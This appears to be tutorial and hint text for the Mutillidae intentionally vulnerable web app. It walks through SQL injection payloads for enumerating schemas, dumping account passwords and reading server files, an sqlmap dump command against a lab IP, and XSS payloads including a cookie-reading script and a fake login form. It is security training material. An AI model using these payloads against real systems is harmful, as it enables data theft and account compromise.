@@ -1,0 +1,239 @@
+	Mutillidae
+
+
+
+    For SSL Injection:The old "' or 1=1 -- " is a classic, but there are others. Check out who you are logged in as after you do the injection.
+    For Session and Authentication:As for playing with sessions, try a cookie editor to change your UID.
+    For Insecure Authentication:Try sniffing the traffic with Wireshark, Cain, Dsniff or Ettercap.
+    Some code contains naive protections such as limiting the width of HTML fields. If your If you find that you need more room, try using a tool like Firebug to change the size of the field to be as long as you like. As you advance, try using tools like netcat to make your own POST requests without having to use the login web page at all.
+    You can use the login page normally but then simply change the parameters with Tamper Data. Because Tamper Data is allowing the user to manipulate the request after the request has left the browser, any HTML or JavaScript has already run and is completely useless as a security measure. Any use of HTML or JavaScript for security purposes is useless anyway. Some developers still fail to recognize this fact to this day.
+    Try SQL injection probing by entering single-quotes, double-quotes, paranthesis, double-dash (--), hyphen-asterik (/*), and closing-parenthesis-hyphen-hyphen ()--)
+    The first step is not gaining access but recon. Gaining access is actually fairly late in the process. To do recon with respect to SQL injection, try to cause errors to see how the application reacts. Some applications (many actually) fail to install custom error pages as required. Try to find out what database is running then inject special characters for that database. After special characters, try fuzzing major characters sets. Finally, if the application still has not produced useful error messages, then try timing attacks. Your goal is to get a reaction. Well built sites wont act differently even when a database error occurs.
+    After performing error recon and blind timing attacks, an entry point may be found to begin data extraction. Initially the best data to extract is data about the database itself. Try to answer the questions of what tables, views, columns, functions, procedures, system procedures, and other objects exist. From the MySQL reference documentation: Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. Other terms that sometimes are used for this information are data dictionary and system catalog. INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them. In effect, we have a database named INFORMATION_SCHEMA, although the server does not create a database directory with that name. It is possible to select INFORMATION_SCHEMA as the default database with a USE statement, but it is possible only to read the contents of tables. You cannot insert into them, update them, or delete from them. Defense: Web apps should not actual have access to any tables or other objects. Web apps should only have one privilege; EXECUTE. Even then, the web app should only be able to execute on one schema and that schema should only contain the procedures needed explicitly by the application. The procs will still have access to the tables in the table schema because databases run procs with the authroity of the owner; not the caller. It works as if the database sets the "suid" bit on procs. Oracle and SQL Server do allow settings which alter this default behavior; for example causing the procs to run as the caller.
+    MySQL information schema tables that would likely be useful to recon:
+        TABLES Table
+        COLUMNS Table
+        USER_PRIVILEGES Table
+        ROUTINES Table
+        VIEWS Table
+        TRIGGERS Table
+    Attempt to recon what type of database is running then study the system functions, tables, and procedures that come with that platform. The built-in functions can come in handy.
+    SQL Servers accept batch queries but MySQL and Oracle do not. However, Oracle is susceptable to all forms of SQL Injection all the same and provides the greatest number of system functions to exploit. MySQL has fewer functions but the ones provided are very useful.
+
+ 
+SQL Injection Tutorial
+
+General Steps
+
+    Determine if SQL injection exists
+        Try injecting characters reserved in databases to produce error messages
+
+        single-quote
+        back-slash
+        double-hyphen
+        forward-slash
+        period
+
+        If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.
+        If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
+
+        Technique: Blind SQL Injection - True and False Values
+        Field: username
+        True Value (Using Proxy): ' or 1=1 --
+        False Value (Using Proxy): ' and 1=0 --
+
+        If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
+
+        ' union Select null, null, null, sleep(5) --
+
+    Determine injection types that work
+        UNION statements
+            Determine number of columns in application query. Inject NULL columns until injected query works.
+            Determine position of a varchar or equivalent column
+            Use position of found column(s) to place injected columns. Use NULL for rest
+        Inline injection
+            Usually happens when ORDER BY or HAVING clause present in application query
+        Timing injection
+
+        Technique: Blind SQL Injection - Timing
+        Page: login.php
+        Field: username
+        Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null --
+        Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1
+
+    Attempt to determine database server brand
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: username
+    Value (Using Proxy): ' union select null,VERSION() AS username,null,null --
+
+    Formulate and test query
+    Attempt to determine database name
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: username
+    Value (Using Proxy): ' union select null,DATABASE() AS username,null,null --
+
+    Attempt to determine schema name
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: username
+    Value (Using Proxy): ' union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES--
+
+    Attempt to determine table(s) names
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: username
+    Value (Using Proxy): ' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES--
+
+    Attempt to determine column(s) names
+
+    Technique: Direct Injection
+    Recon: Extract table columns from database using a single field
+    Page: user-info.php
+    Field: Username
+    Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--
+
+    Attempt to extract data
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: Username
+    Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts --
+
+    Attempt to read files from server
+
+    Technique: Direct Injection
+    Page: user-info.php
+    Field: username
+    Value (relative path):
+    ' union select null, LOAD_FILE('../README') AS username, null, null--
+
+    Value (absolute path):
+    ' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--
+    ' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--
+
+    Attempt to upload files to server
+    Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited system command abilities. SQL Server 2008 disables system commands by default and requires them to be enabled.
+    Attempt to determine database computer name, IP address, username, version, etc.
+
+    MySQL Functions:
+    VERSION() - MySQL server version
+    USER() - Database user issuing query
+    DATABASE() - Database on server against which query is running
+    Attempt to pivot to database server level. This will largely depend on either being able to execute system commands via the database server or upload files to the file system. Uploading files would allow web application pages to be uploaded which can contain system calls.
+
+
+Reconnaissance
+
+Error messages can be excellent sources of information. Developers are often naive about error messages and allow their apps to display errors rather than log the errors privately or email them to support staff. Secure sites use custom error pages that display no error messages. Finding an error message with respect to SQLi typically involves malforming the query on purpose. Special characters can get the job done. Single-quotes and parenthesis often cause errors in SQL Server, Oracle and MySQL databases. Dont forget to use different encodings of each character to see if that makes a difference. For example, try URL encoding, hex, etc. Try those first, then move onto any character that is not alpha-numeric.
+
+Hint: Go to the documentation for ANSI-SQL, Oracle, SQL Server, and MySQL to see which characters are reserved in those respective systems. (ANSI-SQL is the "common" SQL shared by all compliant databases.) In particular, determine what are the comment symbols for the respective systems.
+
+Try to find out what type of database is behind the application. Knowing if the database is Oracle, SQL Server, or MySQL can help a lot. Each has its own meta-tables, functions, system tables, system procedures, and vulnerabilities. If the database is SQL Server or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. They both implement this SQL-92 standard structure. Oracle uses non-standard "Oracle Data Dictionary" views. As of the date of this document, there is an awesome listing at http://ss64.com/orad/.
+
+Sometimes the type of database can be infered by its behavior. For example, SQL Server and MySQL both use "--" (double-hyphen) as the comment symbols; however, MySQL requires a space betwwen the comment symbol and the next character.
+
+This statement is a valid SQL injection against either SQL Server or MySQL:
+
+' union select/**/name/**/FROM/**/INFORMATION_SCHEMA.TABLES-- 
+
+MySQL can be identified by whether the injection requires a space on the end. Oracle and SQL Server do not care if there is a space at the end of the injection or not. But MySQL needs the space on the end. (At least when used with PHP.)
+
+' union select name FROM INFORMATION_SCHEMA.TABLES-- (<-- space required here) 
+
+Determine the page capibilities. If the page displays database records, standard SQL injection is probably the better tool. If the page processes queries but does not display query output (i.e. - a login page), then blind SQLi may be the better tool.
+
+Use the page normally and observe the behavior. For example, log into Mutillidae. Does Mutillidae display any information from the database because you log-in? (No) What happens when using page user-info.php? Does any data displaywhen using page user-info.php? (Yes) The login page is likely going to be a better candidate for blind SQL injection while user-info.php is likely a better candidate for direct SQL injection.
+
+Scanning
+
+Get specifications on database software (Example Page: user-info.php)
+
+' union select null, database(), current_user(), version() -- 
+
+If the meta-tables are available, they can footprint the database structure making the next steps much more productive.
+
+Check the documentation for Oracle, MySQL, and SQL Server. Determine the meta-table structures, table/view names, and column names. If the database is SQL Server or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. They both implement this SQL-92 standard structure. Oracle uses non-standard "Oracle Data Dictionary" views. As of the date of this document, there is an awesome listing at http://ss64.com/orad/.
+
+Extract table names from database. (Example Page: user-info.php)
+
+' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
+
+Extract table columns from database using a single field (Example Page: user-info.php)
+
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
+
+Extract views from database (Example Page: user-info.php)
+
+' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
+
+Extract triggers from database (Example Page: user-info.php)
+
+' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Extract routines/procs from database (Example Page: user-info.php)
+
+' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
+
+Extract table columns from database (Example Page: user-info.php)
+
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+
+Blind SQL injection does not depend on seeing any resulting records. Instead, page timing can be used.
+
+Blind SQL Injection/Brute Forcing values (Example Page: login.php)
+
+' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+
+Gaining Access
+
+Extract passwords from user table (Example Page: user-info.php)
+
+' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+
+Using SQL Injection (Page: login.php)
+
+' or 1=1 -- 
+
+Using SQLMAP to dump database (Page: view-someones-blog.php)
+
+python sqlmap.py --url="http://192.168.56.101/mutillidae/index.php?page=view-someones-blog.php" --data="author=6C57C4B5-B341-4539-977B-7ACB9D42985A&view-someones-blog-php-submit-button=View+Blog+Entries" --level=1 --beep --dump
+ 
+Cross-Site Scripting Tutorial
+
+Cross-Site Scripting occurs because a script is displayed in page output but is not properly encoded. Because of the lack of proper encoding, the browser will execute the script rather than display it as data. Pages that encode all dynamic output are generally immune. The page will simply display the script as text rather than execute the script as code.
+
+The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output. Some input is immediately output on the same or next page. These pages are candidates for reflected Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page. These situations may be ripe for the most dangerous type of XSS; persistent XSS.
+
+Developers may treat input from forms carefully, while completely ignoring input passed via URL Query Parameters, Cookies, HTTP Headers, Logs, Emails, etc. The key is to encode ALL output and not just output that came into the site via forms/POST.
+
+Discovery Methodology
+
+Step 1: For each page under scrutiny, enter a unique string into each form field, url query parameter, cookie value, HTTP Header, etc., record which value has which unique string, submit the page, then observe the resulting page to see if any of your unique strings appeared. Upon finding a unique string, note which value had contained that string and record this on your map.
+
+Unfortunately the input could end up as output on any page within the site, all pages within the site, or none of them. If the values are not reflected immediately but presented on a later page (for example in search results) then it should be assumed the value is stored in a database.
+
+Step 2:The second step is to test all the input locations from step #1 with various scripts, css, html tags, etc. and observe the resulting output. If the site fails to encode output, it is a candidate for XSS.
+
+Methodology: Enter interesting characters such as angle brackets for HTMLi and XSS, Cascading style sheet symbols, etc. to see if the site encodes this output. If the site does not encode output, try inserting XSS, CSS, HTML, etc. and watch for execution. If the site has a WAF, this is likely the point at which you will detect the WAF presence.
+
+Examples
+
+Many examples can be found at http://ha.ckers.org/xss.html
+
+This example is of stealing a cookie. This could be reflected or persistent. To make this persistent, try to get the script stored into a database field which is later output onto a web page.
+
+<script>alert('Cookies which do not have the HTTPOnly attribute set: ' + document.cookie);</script>
+
+Same example with the single-quotes escaped for databases such as MySQL. This allows the XSS to be stored in the database. When the web site (or another site) pulls the XSS from the database at a later time, it will be served with the site content.
+
+<script>alert(\'Cookies which do not have the HTTPOnly attribute set: \' + document.cookie);</script>
+
+Cross site scripting will work in any unencoded output. It does not matter if the value being output initially came from a form field (usually POST) or URL parameteres (GET). If fact the value can come from any source. For example, if a web page outputs the user-agent string in whole or part, you can use a tool such as User-Agent Switcher plug-in for Firefox to attempt XSS via the User-Agent HTTP Header. Any HTTP Header can be forged with or without tools. If you would like to forge an HTTP Header without tools, try Netcat. Other options include intercepting and changing the web request after the request leaves the browser. Burp Suite is an excellent tool to try on your own machine. Try changing the user-agent to the XSS examples on this page. Also, try this sample HTML injection. The XSS could be directly placed into the database then pulled later. This can happen from a hacked database, a rouge DBA, or via SQL injection such as with ASPROX. This is why output encoding is a better defense than input validation for XSS. If the XSS makes it into the database but never has to pass through the validation to get there, input validation will not work.
+
+<h1>Sorry. There has been a system error.<br /><br />Please login again</h1><br/>Username<input type="text"><br/>Password<input type="text"><br/><br/><input type="submit" value="Submit"><h1>&nbsp;</h1> 
